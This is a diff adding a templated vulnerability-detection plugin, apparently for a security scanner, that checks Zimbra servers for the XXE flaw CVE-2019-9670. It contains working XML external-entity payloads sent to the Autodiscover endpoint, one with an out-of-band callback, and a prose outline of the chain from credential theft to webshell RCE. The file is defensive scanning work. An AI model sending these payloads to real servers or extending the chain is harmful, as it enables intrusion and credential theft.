@@ -1,0 +1,152 @@
+# proto-file: proto/templated_plugin.proto
+# proto-message: TemplatedPlugin
+
+###############
+# PLUGIN INFO #
+###############
+
+info: {
+  type: VULN_DETECTION
+  name: "Zimbra_CVE_2019_9670"
+  author: 
+    "Robert Dick (robert@doyensec.com) for templated version, "
+    "Leonardo Tamiano (leonardo.tamiano@mindedsecurity.com) for original Java version"
+  version: "2.0"
+}
+
+finding: {
+  main_id: {
+    publisher: "GOOGLE"
+    value: "CVE_2019_9670"
+  }
+  severity: CRITICAL
+  title: "Synacor Zimbra XXE CVE-2019-9670"
+  description: 
+    "The mailboxd component of Synacor Zimbra Collaboration Suite, in versions from 8.5 to"
+    " 8.7.11p10, is vulnerable to an XML External Entity injection (XXE). The vulnerability"
+    " is found in the autodiscover feature, available to unauthenticated users through the"
+    " endpoint /Autodiscover/Autodiscover.xml. The vulnerability allows malicious actors to"
+    " extract sensitive files from the system and can be chained with another"
+    " vulnerability (CVE-2019-9621) in order to obtain an unauthenticated RCE."
+    " Specifically, by using the XXE (CVE-2019-9670) it is possible to read a configuration"
+    " file that contains an LDAP password for the zimbra account. The zimbra credentials"
+    " are then used to get a user authentication cookie with an AuthRequest message. Using"
+    " the user cookie, a SSRF (CVE-2019-9621) in the Proxy Servlet is used to proxy an"
+    " AuthRequest with the zimbra credentials to the admin port to retrieve an admin"
+    " cookie. After gaining an admin cookie the Client Upload servlet is used to upload a"
+    " JSP webshell that can be triggered from the web server to obtain RCE."
+  recommendation:
+    "Upgrade to non-vulnerable versions of Synacor Zimbra Collaboration Suite such as 8.7.11p14"
+    " or later versions such as 8.8.x, 9.x and 10.x."
+  related_id: {
+    publisher: "CVE",
+    value: "CVE-2019-9670"
+  }
+}
+
+###########
+# ACTIONS #
+###########
+
+actions: {
+  name: "fingerprint_zimbra"
+  http_request: {
+    method: GET
+    uri: "/"
+    response: {
+      http_status: 200
+      expect_all: {
+        conditions: [
+          { 
+            body {} 
+            contains: 'Zimbra Collaboration Suite Web Client'
+          }
+        ]
+      }
+    }
+  }
+}
+
+actions: {
+  name: "trigger_callback"
+  http_request: {
+    method: POST
+    uri: "/Autodiscover/Autodiscover.xml"
+    headers: [
+      { name: "Content-Type" value: "application/xml" }
+    ]
+    data: 
+      "<?xml version=\"1.0\" ?>"
+      "<!DOCTYPE foo [<!ENTITY oob SYSTEM \"{{ T_CBS_URI }}\"> ]>"
+      "<Request>"
+      "<EMailAddress>email</EMailAddress>"
+      "<AcceptableResponseSchema>&oob;</AcceptableResponseSchema>"
+      "</Request>\\"
+  }
+}
+
+actions: {
+  name: "sleep"
+  utility: { sleep: { duration_ms: 5000 } }
+}
+
+actions: {
+  name: "check_callback_server_logs"
+  callback_server: { action_type: CHECK }
+}
+
+# backup action in case callback server is disabled or unreachable
+
+actions: {
+  name: "check_reflected_xxe"
+  http_request: {
+    method: POST
+    uri: "/Autodiscover/Autodiscover.xml"
+    headers: [
+      { name: "Content-Type" value: "application/xml" }
+    ]
+    data: 
+      "<?xml version=\"1.0\" ?>"
+      "<!DOCTYPE foo [<!ENTITY xxe \"{{ T_UTL_CURRENT_TIMESTAMP_MS }}\"> ]>"
+      "<Request>"
+      "<EMailAddress>email</EMailAddress>"
+      "<AcceptableResponseSchema>&xxe;</AcceptableResponseSchema>"
+      "</Request>\\"
+    response: {
+      http_status: 503
+      expect_all: {
+        conditions: [
+          { 
+            body {} 
+            contains: 'Error 503 Requested response schema not available'
+          },
+          { 
+            body {} 
+            contains: '{{ T_UTL_CURRENT_TIMESTAMP_MS }}'
+          }
+        ]
+      }
+    }
+  }
+}
+
+#############
+# WORKFLOWS #
+#############
+
+workflows: {
+  condition: REQUIRES_CALLBACK_SERVER
+  actions: [
+    "fingerprint_zimbra",
+    "trigger_callback",
+    "sleep",
+    "check_callback_server_logs"
+  ]
+}
+
+workflows: {
+  actions: [
+    "fingerprint_zimbra",
+    "check_reflected_xxe"
+  ]
+}
